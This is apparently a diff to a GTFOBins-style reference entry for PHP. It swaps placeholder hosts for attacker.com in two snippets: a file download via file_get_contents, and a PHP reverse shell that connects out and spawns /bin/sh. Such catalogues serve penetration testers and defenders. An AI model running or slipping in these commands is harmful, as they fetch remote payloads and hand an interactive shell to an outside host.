@@ -28,13 +28,13 @@ functions:
   download:
     - description: Fetch a remote file via HTTP GET request.
       code: |-
-        export URL=http://10.0.0.1/file_to_get
-        export LFILE=file_to_get
+        export URL=http://attacker.com/file_to_get
+        export LFILE=where_to_save
         php -r '$c=file_get_contents($_ENV["URL"]);file_put_contents($_ENV["LFILE"], $c);'
   reverse-shell:
     - description: Run `nc -l -p 12345` to receive the shell on the other end.
       code: |
-        export RHOST=127.0.0.1 
+        export RHOST=attacker.com
         export RPORT=12345 
         php -r '$sock=fsockopen($_ENV["RHOST"],$_ENV["RPORT"]);exec("/bin/sh -i <&3 >&3 2>&3");'
 ---
